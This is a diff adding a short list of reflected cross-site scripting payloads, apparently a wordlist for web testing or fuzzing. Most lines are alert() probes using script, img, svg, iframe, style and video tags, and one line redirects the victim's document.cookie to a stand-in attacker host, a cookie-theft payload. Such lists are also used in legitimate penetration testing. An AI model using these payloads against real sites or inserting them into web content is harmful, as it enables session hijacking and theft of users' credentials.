@@ -1,0 +1,10 @@
+"><script>alert('Reflected XSS')</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert('Reflected XSS')>
+<script>window.location='http://attacker.com?cookie='+document.cookie</script>
+<svg/onload=alert('Reflected XSS')>
+'"><img src=x onerror=alert('Reflected XSS')>
+"><body onload=alert('Reflected XSS')>
+"><iframe src=javascript:alert('Reflected XSS')>
+"><style>@import 'javascript:alert("Reflected XSS")';</style>
+"><video><source onerror="javascript:alert('Reflected XSS');"></video>
